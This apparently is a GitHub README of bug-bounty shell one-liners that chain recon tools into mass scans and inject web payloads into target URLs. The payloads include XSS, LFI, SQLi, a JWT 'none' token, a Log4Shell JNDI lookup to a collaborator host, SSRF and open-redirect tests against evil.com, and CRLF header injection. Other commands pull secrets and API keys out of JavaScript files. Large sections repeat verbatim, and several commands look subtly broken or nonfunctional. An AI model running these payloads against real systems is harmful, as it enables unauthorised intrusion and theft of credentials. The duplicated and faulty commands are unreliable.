# OneLinerBounty

Welcome to **OneLinerBounty**! 🚀

This repository is a collection of **concise**, **actionable** bug bounty tips, each carefully crafted into a single line. Whether you're just getting started or you're a seasoned bug hunter, these tips will help you level up your skills, save time, and uncover more vulnerabilities. 💡

## Why OneLiners?

In the world of bug bounty hunting, time is precious. Short, impactful tips can make all the difference. Here, you'll find quick insights that can easily be referenced when you're diving into a new target, testing a feature, or looking to refine your methodology. 🔍

---

## 🌟 Let's Connect!

Hello, Hacker! 👋 We'd love to stay connected with you. Reach out to us on any of these platforms and let's build something amazing together:
 
📜 **Linktree:** [https://linktr.ee/yogsec](https://linktr.ee/yogsec)  
📷 **Instagram:** [https://www.instagram.com/yogsec.io/](https://www.instagram.com/yogsec.io/)  
🐦 **Twitter (X):** [https://x.com/yogsec](https://x.com/yogsec)  
👨‍💼 **Personal LinkedIn:** [https://www.linkedin.com/in/cybersecurity-pentester/](https://www.linkedin.com/in/cybersecurity-pentester/)  
📧 **Email:** abhinavsingwal@gmail.com

## ☕ Buy Me a Coffee

If you find our work helpful and would like to support us, consider buying us a coffee. Your support keeps us motivated and helps us create more awesome content. ❤️

☕ **Support Us Here:** [https://buymeacoffee.com/yogsec](https://buymeacoffee.com/yogsec)


---

# OneLinerBounty

## Quick Bug Bounty Tips

Here are some essential one-liners for various bug bounty tasks:

### Misconfigurations, Tech Detection, and Common Bugs
If you want wider coverage, like misconfigurations, tech detection, and common bugs, change the template path to `-t vulnerabilities/`:

```bash
cat urls.txt | httpx -silent -mc 200 | nuclei -silent -t vulnerabilities/ -o results.txt
```

### Subdomain Takeovers - Quick Check
Want to check for subdomain takeovers in one line?

```bash
subfinder -d example.com | httpx -silent | nuclei -silent -t takeovers/ -o takeover.txt
```

### Subdomain Discovery + Live Check
For subdomain discovery with live check:

```bash
subfinder -d target.com | httpx -silent -mc 200
```

### Subdomain Takeover Detection
Detect subdomain takeovers:

```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/
```

### Directory Bruteforce (Content Discovery)
For directory bruteforce:

```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200
```

### Find Open Redirects (Quick Scan)
To quickly find open redirects:

```bash
cat urls.txt | gf redirect | httpx -silent
```

### XSS Detection (Using Dalfox)
For XSS detection using Dalfox:

```bash
cat urls.txt | dalfox pipe --skip-bav --only-poc
```

### SQL Injection Discovery
For SQL Injection discovery:

```bash
cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -
```

### Subdomain Takeovers - Quick Check
Want to check for subdomain takeovers in one line?

```bash
subfinder -d example.com | httpx -silent | nuclei -silent -t takeovers/ -o takeover.txt
```

### Subdomain Discovery + Live Check
For subdomain discovery with live check:

```bash
subfinder -d target.com | httpx -silent -mc 200
```

### Subdomain Takeover Detection
Detect subdomain takeovers:

```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/
```

### Directory Bruteforce (Content Discovery)
For directory bruteforce:

```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200
```

### Find Open Redirects (Quick Scan)
To quickly find open redirects:

```bash
cat urls.txt | gf redirect | httpx -silent
```

### XSS Detection (Using Dalfox)
For XSS detection using Dalfox:

```bash
cat urls.txt | dalfox pipe --skip-bav --only-poc
```

### SQL Injection Discovery
For SQL Injection discovery:

```bash
cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -
```

### Find Sensitive Files (Backup, Config, etc.)
To find sensitive files like backups and configuration files:

```bash
cat urls.txt | waybackurls | grep -Ei '\.(bak|old|backup|log|env|sql|config)$'
```

### CORS Misconfiguration Detection
To detect CORS misconfigurations:

```bash
cat urls.txt | corscanner
```

### Detect Technologies + Possible CVEs
To detect technologies and possible CVEs:

```bash
cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/
```

### Parameter Discovery (for further testing)
To discover parameters for further testing:

```bash
cat urls.txt | waybackurls | uro | grep '?'
```

### Full Recon Chain (Subdomains + Live Check + Technologies + Titles)
For full recon chain:

```bash
subfinder -d target.com | httpx -silent -title -tech-detect
```

### Subdomain Enum + Ports Scan (Fast)
For a fast subdomain enumeration and port scan:

```bash
subfinder -d target.com | naabu -silent -top-ports 1000
```

### All URLs from Wayback, CommonCrawl, and AlienVault
To get all URLs from Wayback, CommonCrawl, and AlienVault:

```bash
gau target.com | tee urls.txt
```

### Find Secrets in JS Files
To find secrets in JS files:

```bash
cat urls.txt | grep '\.js$' | httpx -silent | xargs -I{} bash -c 'curl -s {} | tr "[:space:]" "\n" | grep -Ei "(api|key|token|secret|password|passwd|authorization)="'
```

### Find Open AWS Buckets
To find open AWS buckets:

```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t s3-detect.yaml
```

### Find Misconfigured Login Panels
To find misconfigured login panels:

```bash
cat urls.txt | nuclei -silent -t exposed-panels/
```

### Check All Parameters for Reflected XSS
To check all parameters for reflected XSS:

```bash
cat urls.txt | gf xss | dalfox pipe --skip-bav --only-poc
```

### Check for Exposed Git Repositories
To check for exposed Git repositories:

```bash
cat urls.txt | httpx -silent -path "/.git/config" -mc 200
```

### Extract All Parameters from URLs (for manual testing)
To extract all parameters from URLs for manual testing:

```bash
cat urls.txt | uro | grep '?'
```

### Takeover Domains from Subdomain List
To perform takeover checks on domains from a subdomain list:

```bash
cat subdomains.txt | nuclei -silent -t takeovers/
```

### Find CVEs Based on Technology
To find CVEs based on technology:

```bash
cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/
```

### Find Top Ports + Services for All Subdomains (Recon + Port Scan)
To find the top ports and services for all subdomains:

```bash
subfinder -d target.com | naabu -top-ports 1000 -silent
```

### Extract All Endpoints from JS Files (JS Analysis)
To extract all endpoints from JS files for analysis:

```bash
cat urls.txt | grep '\.js$' | httpx -silent | xargs -I{} bash -c 'curl -s {} | grep -oE "(/api/v[0-9]+/[^\"'\'']+|/[a-zA-Z0-9_/.-]+\.(php|aspx|jsp|html|json|xml|txt))"'
```

### Subdomain Discovery + Live Check
For subdomain discovery with live check:

```bash
subfinder -d target.com | httpx -silent -mc 200
```

### Subdomain Takeover Detection
Detect subdomain takeovers:

```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/
```

### Directory Bruteforce (Content Discovery)
For directory bruteforce:

```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200
```

### Find Open Redirects (Quick Scan)
To quickly find open redirects:

```bash
cat urls.txt | gf redirect | httpx -silent
```

### XSS Detection (Using Dalfox)
For XSS detection using Dalfox:

```bash
cat urls.txt | dalfox pipe --skip-bav --only-poc
```

### SQL Injection Discovery
For SQL Injection discovery:

```bash
cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -
```

### Find Sensitive Files (Backup, Config, etc.)
To find sensitive files like backups and configuration files:

```bash
cat urls.txt | waybackurls | grep -Ei '\.(bak|old|backup|log|env|sql|config)$'
```

### CORS Misconfiguration Detection
To detect CORS misconfigurations:

```bash
cat urls.txt | corscanner
```

### Detect Technologies + Possible CVEs
To detect technologies and possible CVEs:

```bash
cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/
```

### Parameter Discovery (for further testing)
To discover parameters for further testing:

```bash
cat urls.txt | waybackurls | uro | grep '?'
```

### Full Recon Chain (Subdomains + Live Check + Technologies + Titles)
For full recon chain:

```bash
subfinder -d target.com | httpx -silent -title -tech-detect
```

### Subdomain Enum + Ports Scan (Fast)
For a fast subdomain enumeration and port scan:

```bash
subfinder -d target.com | naabu -silent -top-ports 1000
```

### All URLs from Wayback, CommonCrawl, and AlienVault
To get all URLs from Wayback, CommonCrawl, and AlienVault:

```bash
gau target.com | tee urls.txt
```

### Find Secrets in JS Files
To find secrets in JS files:

```bash
cat urls.txt | grep '\.js$' | httpx -silent | xargs -I{} bash -c 'curl -s {} | tr "[:space:]" "\n" | grep -Ei "(api|key|token|secret|password|passwd|authorization)="'
```

### Find Open AWS Buckets
To find open AWS buckets:

```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t s3-detect.yaml
```

### Find Misconfigured Login Panels
To find misconfigured login panels:

```bash
cat urls.txt | nuclei -silent -t exposed-panels/
```

### Check All Parameters for Reflected XSS
To check all parameters for reflected XSS:

```bash
cat urls.txt | gf xss | dalfox pipe --skip-bav --only-poc
```

### Check for Exposed Git Repositories
To check for exposed Git repositories:

```bash
cat urls.txt | httpx -silent -path "/.git/config" -mc 200
```

### Extract All Parameters from URLs (for manual testing)
To extract all parameters from URLs for manual testing:

```bash
cat urls.txt | uro | grep '?'
```

### Takeover Domains from Subdomain List
To perform takeover checks on domains from a subdomain list:

```bash
cat subdomains.txt | nuclei -silent -t takeovers/
```

### Find CVEs Based on Technology
To find CVEs based on technology:

```bash
cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/
```

### Find Top Ports + Services for All Subdomains (Recon + Port Scan)
To find the top ports and services for all subdomains:

```bash
subfinder -d target.com | naabu -top-ports 1000 -silent
```

### Extract All Endpoints from JS Files (JS Analysis)
To extract all endpoints from JS files for analysis:

```bash
cat urls.txt | grep '\.js$' | httpx -silent | xargs -I{} bash -c 'curl -s {} | grep -oE "(/api/v[0-9]+/[^\"'\'']+|/[a-zA-Z0-9_/.-]+\.(php|aspx|jsp|html|json|xml|txt))"'
```

### Scan for Backup Files (Old Config/DB Dumps)
To scan for backup files, old config, or DB dumps:

```bash
cat urls.txt | httpx -silent -path-list <(echo -e "/.env\n/config.php\n/backup.zip\n/database.sql\n/admin.bak") -mc 200
```

### Find Open .git Folders (Source Leak)
To find open `.git` folders:

```bash
cat subdomains.txt | httpx -silent -path "/.git/config" -mc 200
```

### WordPress Scan (Detect Plugins, Themes, etc.)
For WordPress scan to detect plugins, themes, etc.:

```bash
cat urls.txt | nuclei -silent -t technologies/wordpress/
```

### Hunt for CRLF Injection (Newline Injection)
To hunt for CRLF injection:

```bash
cat urls.txt | gf crlf | qsreplace '%0d%0aTestHeader:TestValue' | httpx -silent -hdrs
```

### Detect CORS Misconfigurations (Very Common Bug)
To detect CORS misconfigurations:

```bash
cat urls.txt | corscanner
```

### Test All URLs for LFI (Local File Inclusion)
To test all URLs for LFI:

```bash
cat urls.txt | gf lfi | qsreplace '/etc/passwd' | httpx -silent -mc 200
```

### Find Information Disclosure via Backup Files
To find information disclosure via backup files:

```bash
cat urls.txt | waybackurls | grep -Ei '\.(bak|old|backup|log|sql|env|zip|tar|gz|rar)$' | httpx -silent -mc 200
```

### Find Exposed Panels (Admin, Login, etc.)
To find exposed admin/login panels:

```bash
cat urls.txt | nuclei -silent -t exposed-panels/
```

### Full JS Hunting + Secrets Scan (for frontend leaks)
For full JS hunting and secrets scan:

```bash
gau target.com | grep '\.js$' | httpx -silent | xargs -I{} bash -c 'echo {} && curl -s {} | tr -d "\r" | grep -E -i "(api[_-]?key|secret|token|auth|password|passwd|client[_-]?id|client[_-]?secret)="'
```

### Search for Open Redirects (URL Redirect issues)
To search for open redirects:

```bash
cat urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -mc 302,301 -fr 'evil.com'
```

### Quick Scan for SQL Injection
For a quick SQL injection scan:

```bash
cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -
```

### Find Interesting Endpoints (Like admin, login, debug, etc.)
To find interesting endpoints like admin, login, debug, etc.:

```bash
gau target.com | grep -Ei '/(admin|login|debug|test|backup|panel|dashboard)'
```

### Check for Exposed Config Files (like .env, .git, .DS_Store)
To check for exposed config files:

```bash
cat urls.txt | httpx -silent -path-list <(echo -e '/.env\n/.git/config\n/.DS_Store\n/config.php\n/config.json') -mc 200
```

### Scan for CVE in All Subdomains
To scan for CVEs in all subdomains:

```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t cves/
```

### Full Backup File Search (All extensions that leak data)
To search for all extensions that leak backup files:

```bash
gau target.com | grep -Ei '\.(bak|old|backup|sql|log|tar|zip|gz|rar|swp|env|config)$' | httpx -silent -mc 200
```

### Check for CORS Misconfigurations
To check for CORS misconfigurations:

```bash
cat urls.txt | corscanner
```

### Scan for Open Admin Panels (Exposed Panels)
```bash
cat urls.txt | nuclei -silent -t exposed-panels/
```

### ALL-IN-ONE MEGA SCAN 💣 (Subdomain + Alive + CVE Scan + Panels)
```bash
subfinder -d target.com | httpx -silent -mc 200 | tee alive.txt | nuclei -silent -t cves/,exposed-panels/
```

### All-in-One Recon Pipeline (Subdomains → Probing → Ports → Tech Detection → Titles)
```bash
subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | anew alive.txt
```

### Mass Fetch JS Files + Find Secrets + Endpoints + Tokens
```bash
cat alive.txt | hakrawler -subs | grep '\.js$' | anew jsfiles.txt && cat jsfiles.txt | xargs -I{} bash -c 'curl -s {} | tr -d "\r" | egrep -i "(api|key|token|secret|password|passwd|authorization|bearer|client_id|client_secret)"' | tee secrets.txt
```

### Check for Open Redirects Across All Params (with Payload Injection)
```bash
cat alive.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -mc 302,301
```

### Automatic Vulnerability Scan (Subdomains to CVE Detection + Misconfigs)
```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t cves/,misconfiguration/
```

### Backup Files Bruteforce Across All Hosts
```bash
cat alive.txt | httpx -silent -path-list <(echo -e "/.git/config\n/.env\n/database.sql\n/backup.zip\n/config.php\n/wp-config.php") -mc 200 | tee backups.txt
```

### Check for Parameter-Based XSS (Direct Injection Testing)
```bash
cat alive.txt | hakrawler -subs -depth 2 | gf xss | qsreplace '"><script>alert(document.domain)</script>' | httpx -silent -fr 'alert(document.domain)'
```

### Automated LFI Discovery (Common Payloads)
```bash
cat alive.txt | gf lfi | qsreplace '../../../../../../etc/passwd' | httpx -silent -mc 200
```

### Fuzz Parameters & Check Reflections (for XSS & Injection Discovery)
```bash
cat alive.txt | waybackurls | gf params | uro | qsreplace FUZZ | ffuf -u FUZZ -w wordlists/payloads/xss.txt -fr 'FUZZ'
```

### Subdomain Takeover Detection (Live Scan + Detection)
```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/
```

### Full Asset Discovery + Technology Analysis + Title Collection
```bash
assetfinder --subs-only target.com | httpx -silent -title -tech-detect | tee assets_with_tech.txt
```

### Mega Pipeline - Subdomains → URLs → Parameters → XSS/SQL/Secrets
```bash
subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent | hakrawler -subs -depth 2 | anew urls.txt && cat urls.txt | gf xss | dalfox pipe --skip-bav --only-poc | tee xss_poc.txt && cat urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | egrep -i "(api|key|token|secret|password|passwd|auth)"' | tee secrets.txt
```

### Ultimate Recon Monster (Subdomains → Probing → Ports → Technologies → CVEs)
```bash
subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee tech_scan.txt && cat tech_scan.txt | nuclei -silent -t cves/
```

### Automated Asset Hunting + JS Analysis + Secret Finder
```bash
subfinder -d target.com | httpx -silent -mc 200 | hakrawler -subs -depth 3 -plain | anew urls.txt && cat urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | tr -d "\r" | gf secrets | tee -a secrets.txt'
```

### Mass Fuzz Every Parameter with XSS, LFI, SQLi Payloads (Ultimate Param Attacker)
```bash
cat urls.txt | gf xss,lfi,sqli | uro | qsreplace FUZZ | ffuf -u FUZZ -w xss.txt,lfi.txt,sqli.txt -fr "FUZZ" | tee param_fuzz.txt
```

### Subdomain Takeover, DNS Hijack, Misconfig Scan - All In One
```bash
subfinder -d target.com | dnsx -a -resp-only -silent | nuclei -silent -t takeovers/,dns/
```

### Automatic Full Backup File Bruteforcing Across All Hosts (Super Leaks Finder)
```bash
subfinder -d target.com | httpx -silent | anew alive.txt && cat alive.txt | httpx -silent -path-list <(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/backup.txt) -mc 200 | tee backups_found.txt
```

### Deep Directory Brute Force (Smart Recursive Finder)
```bash
subfinder -d target.com | httpx -silent | anew alive.txt && cat alive.txt | xargs -I{} gobuster dir -u {} -w big_wordlist.txt -t 50 -o gobuster_output.txt
```

### Blind SSRF Auto-Detection in All Parameters
```bash
cat urls.txt | gf ssrf | qsreplace 'http://canarytoken.com' | httpx -silent -mc 200 -fr 'canarytoken'
```

### Mega Wordlist Generator from Wayback + JS + HTML Comments + Robots.txt + Sitemap.xml
```bash
subfinder -d target.com | httpx -silent | anew alive.txt && cat alive.txt | hakrawler -subs -depth 2 | anew urls.txt && cat urls.txt | gf wordlist | anew wordlist.txt
```

### Full Sitemap & Robots Extraction Across Subdomains
```bash
subfinder -d target.com | httpx -silent -path-list <(echo -e "/robots.txt\n/sitemap.xml") -mc 200 | tee robots_sitemaps.txt
```

### CRLF Injection Full Auto Discovery & Exploit
```bash
cat urls.txt | gf crlf | qsreplace '%0d%0aTest-Header: InjectedValue' | httpx -silent -hdrs | tee crlf_vulns.txt
```

### CSP Analyzer Across All Hosts (Misconfig Finder)
```bash
cat alive.txt | httpx -silent -path / -mc 200 -hdrs | grep -i 'content-security-policy' | tee csp_misconfig.txt
```

### Full JS Endpoint Extraction + Sensitive Function Search (eval, document.write, etc.)
```bash
cat urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | grep -E -o "(http|https)://[^\" ]+" | anew js_endpoints.txt && curl -s {} | egrep -i "(document\.write|eval|innerHTML|fetch|XMLHttpRequest|localStorage|sessionStorage|cookie)" | tee -a sensitive_js.txt'
```

### Recon + Full Vuln Scan + CORS, Headers, CVE, Misconfig, Secrets — One Command to Rule Them All
```bash
subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee alive.txt && cat alive.txt | nuclei -silent -t cves/,misconfiguration/,exposures/,default-logins/,panels/ | tee findings.txt && cat alive.txt | hakrawler -subs -depth 3 | anew urls.txt && cat urls.txt | gf xss,sqli,lfi,ssrf | dalfox pipe --skip-bav --only-poc | tee vulns.txt && cat urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | tr -d "\r" | gf secrets' | tee secrets_found.txt
```

### Subdomain Takeover + Open Redirect Chain (Full Passive → Exploit Ready)
```bash
subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/,redirect/ -o takeover_redirects.txt
```

### Full Parameter Discovery + Automated Fuzzing (XSS, SQLi, LFI, SSRF)
```bash
gau target.com | gf xss,lfi,sqli,ssrf | qsreplace FUZZ | ffuf -u FUZZ -w payloads/xss.txt,payloads/lfi.txt,payloads/sqli.txt,payloads/ssrf.txt -fr "FUZZ" | tee param_vulns.txt
```

### Auto Search for Backup Files + Leaked Configs (All Subdomains)
```bash
subfinder -d target.com | httpx -silent -path-list <(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/backup.txt) -mc 200 | tee backup_leaks.txt
```

### Deep Web Archive Scraping + JS Secrets Extraction
```bash
gau --subs target.com | grep '\.js$' | httpx -silent -status-code -mc 200 | xargs -I{} bash -c 'curl -s {} | gf secrets' | tee js_secrets.txt
```

### Auto-Dump All Endpoints from Wayback, JS, Robots.txt, Sitemap.xml
```bash
subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent -path-list <(echo -e "/robots.txt\n/sitemap.xml") -mc 200 | hakrawler -subs -depth 3 | anew all_urls.txt
```

### CSP Bypass Finder (Auto Fetch CSP Across All Subdomains)
```bash
subfinder -d target.com | httpx -silent -path / -mc 200 -hdrs | grep -i 'content-security-policy' | tee csp_policies.txt
```

### Automatic SSRF Detection (Using Collaborator/Canarytokens)
```bash
gau target.com | gf ssrf | qsreplace 'http://your-collaborator-url.burpcollaborator.net' | httpx -silent
```

### Deep Search for Hidden Panels + Config Pages (Across All Ports)
```bash
subfinder -d target.com | httpx -silent -ports 80,443,8080,8443 | nuclei -silent -t panels/,exposures/configs/ -o exposed_panels.txt
```

### Entire Subdomain + Tech Stack + CVE + Misconfig Scan (Full Recon Bomb)
```bash
subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | nuclei -silent -t cves/,misconfiguration/ -o full_scan.txt
```

### Auto-Scrape HTML Comments for Sensitive Info
```bash
cat all_urls.txt | httpx -silent -mc 200 -fr 'text/html' -body | grep -iE "<!--.*-->" | tee html_comments.txt
```

### URL Extraction from JS Files (Full Recursive)
```bash
cat all_urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | grep -Eo "(https?|ftp)://[a-zA-Z0-9./?=_-]*"' | anew extracted_urls.txt
```

### Super Bruteforce for Backup + Git + Env + SQL Dumps
```bash
subfinder -d target.com | httpx -silent -path-list <(echo -e "/.git/\n/.env\n/database.sql\n/backup.zip\n/config.yml") -mc 200 | tee sensitive_files.txt
```

### Advanced Open Redirect Scanner Across All Params
```bash
cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirects.txt
```

### Full Headers Security Misconfig Audit
```bash
subfinder -d target.com | httpx -silent -path / -mc 200 -hdrs | nuclei -silent -t misconfiguration/http-headers/ -o header_issues.txt
```

### Auto-Gather All IPs, ASN, WHOIS for Every Subdomain
```bash
subfinder -d target.com | dnsx -a -resp-only | anew all_ips.txt && cat all_ips.txt | xargs -I{} sh -c 'whois {} | grep -iE "OrgName|NetName|CIDR"' | tee whois_lookup.txt
```

### Master Recon + Scan Pipeline (One-Liner)
```bash
subfinder -d target.com | tee subs.txt && cat subs.txt | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee tech_info.txt && cat subs.txt | hakrawler -subs -depth 3 | anew urls.txt && cat urls.txt | nuclei -silent -t cves/,misconfiguration/,takeovers/,panels/,redirect/ -o nuclei_findings.txt && cat urls.txt | gf xss,sqli,lfi,ssrf,redirect | qsreplace FUZZ | ffuf -u FUZZ -w payloads/xss.txt,payloads/sqli.txt,payloads/lfi.txt,payloads/ssrf.txt -fr "FUZZ" | tee param_scan.txt
```

### Additional Specific Recon + Vulnerability Scanning Commands

#### Directory Traversal (Across All Endpoints)
```bash
cat all_urls.txt | gf lfi | qsreplace '../../../../../etc/passwd' | httpx -silent -fr 'root:x' -o traversal_hits.txt
```

#### Exposed Git Repos Finder (Automated)
```bash
subfinder -d target.com | httpx -silent -path /.git/HEAD -mc 200 -o exposed_git.txt
```

#### IDOR Discovery (Bruteforce Parameter Tampering)
```bash
cat all_urls.txt | gf idor | qsreplace 'id=123' | anew idor_urls.txt && qsreplace 'id=124' | httpx -silent -mc 200 -o possible_idor.txt
```

#### JWT Token Misconfig (None Algorithm)
```bash
cat all_urls.txt | grep -Ei 'jwt|token' | qsreplace 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' | httpx -silent -mc 200 -o jwt_none.txt
```

#### Unrestricted File Upload (Testing Common Upload Points)
```bash
cat all_urls.txt | gf upload | qsreplace 'file=payload.php' | httpx -silent -upload-file payload.php -o upload_findings.txt
```

#### Path Confusion + Overlays (Detect Double Extensions)
```bash
cat all_urls.txt | sed 's/$/%00index.php/' | httpx -silent -mc 200 -o path_confusion.txt
```

#### CORS Wildcard + Credentials Misconfig
```bash
subfinder -d target.com | httpx -silent -path / -H 'Origin: https://evil.com' -hdrs | grep -i 'access-control-allow-origin' | grep 'evil.com' | tee weak_cors.txt
```

#### Log4Shell Finder (Old but Gold)
```bash
cat all_urls.txt | gf ssrf | qsreplace '${jndi:ldap://your-collaborator-url.burpcollaborator.net}' | httpx -silent
```

#### Server Side Template Injection (SSTI Detection)
```bash
cat all_urls.txt | gf ssti | qsreplace '{{7*7}}' | httpx -silent -fr '49' -o ssti_hits.txt
```

#### Prototype Pollution Detection (Direct & Indirect)
```bash
cat all_urls.txt | gf parameters | qsreplace '__proto__[exploit]=polluted' | httpx -silent -fr 'polluted' -o prototype_pollution.txt
```

#### Exposed Debug Pages (Stack Traces, Debug Consoles)
```bash
subfinder -d target.com | httpx -silent -path-list <(echo -e '/debug\n/_profiler\n/_debugbar\n/_error') -mc 200 -o debug_pages.txt
```

#### Email Leaks in JS Files
```bash
cat all_urls.txt | grep '\.js$' | xargs -I{} curl -s {} | grep -Eo "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | tee emails_found.txt
```

### Cloud Misconfig - Public S3 Buckets
```bash
subfinder -d target.com | httpx -silent -path / -hdrs | grep -i 'x-amz-bucket-region' | tee public_s3.txt
```

### Exposed Admin Panels (Full Auto Discovery)
```bash
subfinder -d target.com | httpx -silent -path-list <(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/admin-panels.txt) -mc 200 -o exposed_admins.txt
```

### Mass Content Injection Check (Reflected Params)
```bash
cat all_urls.txt | gf xss | qsreplace '<script>alert(1)</script>' | httpx -silent -fr '<script>alert(1)</script>' -o reflected_xss.txt
```

### BONUS — Ultimate ALL Misconfig Scanner (Headers, Panels, Debug, Leaks)
```bash
subfinder -d target.com | httpx -silent -title -tech-detect | nuclei -silent -t misconfiguration/ -o misconfigs_found.txt
```

### API Key Leaks in JS Files
```bash
cat all_js_urls.txt | xargs -I{} curl -s {} | grep -Eo 'AIza[0-9A-Za-z_-]{35}|sk_live_[0-9a-zA-Z]{24}' | tee leaked_api_keys.txt
```

### Backup Files Discovery (Think: .bak, .old, .swp)
```bash
cat all_urls.txt | sed -E 's/(.*)/\1~\n\1.bak\n\1.old\n\1.swp/' | httpx -silent -mc 200 -o backup_files.txt
```

### PHP Unit RCE Finder (Real-World Gold)
```bash
subfinder -d target.com | httpx -silent -path /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -mc 200 -o phpunit_rce.txt
```

### GraphQL Misconfig Detection (Introspection Enabled)
```bash
cat all_urls.txt | grep 'graphql' | xargs -I{} curl -s -X POST -d '{"query":"{__schema{types{name}}}"}' {} | grep -iq 'types' && echo "{} introspection enabled" >> graphql_misconfigs.txt
```

### Host Header Injection
```bash
cat all_urls.txt | httpx -silent -H 'Host: evil.com' -hdrs | grep -i 'evil.com' | tee host_header_injection.txt
```

### Open Redirect Finder (Redirection Abuse)
```bash
cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'https://evil.com' -o open_redirects.txt
```

### Session Fixation Detection
```bash
cat all_urls.txt | gf login | qsreplace 'sessionid=1234abcd' | httpx -silent -fr '1234abcd' -o session_fixation.txt
```

### Exposed .env Files (Sensitive Config Exposure)
```bash
subfinder -d target.com | httpx -silent -path /.env -mc 200 -o exposed_env.txt
```

### SSRF Detection (Collaboration Automation)
```bash
cat all_urls.txt | gf ssrf | qsreplace 'http://your-collab-url.burpcollaborator.net' | httpx -silent
```

### CRLF Injection
```bash
cat all_urls.txt | gf crlf | qsreplace '%0D%0ASet-Cookie:crlf=found' | httpx -silent -fr 'crlf=found' -o crlf_injections.txt
```

### CMS Detection (for Known Exploits)
```bash
subfinder -d target.com | httpx -silent -tech-detect -o cms_detected.txt
```

### Missing Security Headers (Easy Win)
```bash
cat all_urls.txt | httpx -silent -H 'X-Content-Type-Options' -H 'X-Frame-Options' -H 'Content-Security-Policy' -H 'Strict-Transport-Security' | grep -E "missing|absent" | tee weak_headers.txt
```

### Cache Poisoning Detection
```bash
cat all_urls.txt | gf cache | qsreplace 'X-Forwarded-Host: evil.com' | httpx -silent -fr 'evil.com' -o cache_poisoning.txt
```

### Client-Side Prototype Pollution
```bash
cat all_js_urls.txt | xargs -I{} curl -s {} | grep -E 'prototype|__proto__|constructor' | tee client_side_prototype.txt
```

### Sensitive Image Exposures (Backups/Logs)
```bash
subfinder -d target.com | httpx -silent -path-list <(echo -e '/backup.jpg\n/screenshot.png\n/db-dump.png\n/log.png') -mc 200 -o exposed_images.txt
```

### BONUS — Full Recon Workflow One-Liner
```bash
subfinder -d target.com | httpx -silent -title -tech-detect | nuclei -silent -t vulnerabilities/ -o all_findings.txt
```

### Log4j Vulnerability Scanner (JNDI Injection)
```bash
cat all_urls.txt | qsreplace '${jndi:ldap://your-collab-url.burpcollaborator.net/a}' | httpx -silent -o log4j_candidates.txt
```

### AWS S3 Bucket Takeover (Misconfigured Buckets)
```bash
subfinder -d target.com | sed 's/$/.s3.amazonaws.com/' | httpx -silent -mc 200 -o open_buckets.txt
```

### JWT Secrets Brute Force (Weak Signing Key)
```bash
cat jwt_tokens.txt | jwt-cracker -w wordlist.txt -t 50 -o weak_jwt_keys.txt
```

### CORS Misconfiguration Finder
```bash
cat all_urls.txt | httpx -silent -H 'Origin: https://evil.com' -hdrs | grep -E "Access-Control-Allow-Origin: \*|Access-Control-Allow-Origin: https://evil.com" | tee cors_vulns.txt
```

### GCP Bucket Enumeration (Google Cloud)
```bash
subfinder -d target.com | sed 's/$/.storage.googleapis.com/' | httpx -silent -mc 200 -o open_gcp_buckets.txt
```

### Python Pickle Injection Check (Deserialization Bug)
```bash
cat all_urls.txt | gf deserialize | qsreplace 'evil_pickle_payload_here' | httpx -silent -o pickle_vulns.txt
```

### SQL Injection (Error-Based Detection)
```bash
cat all_urls.txt | gf sqli | qsreplace "' OR 1=1 --" | httpx -silent -fr 'syntax|sql|error|database' -o sql_injection.txt
```

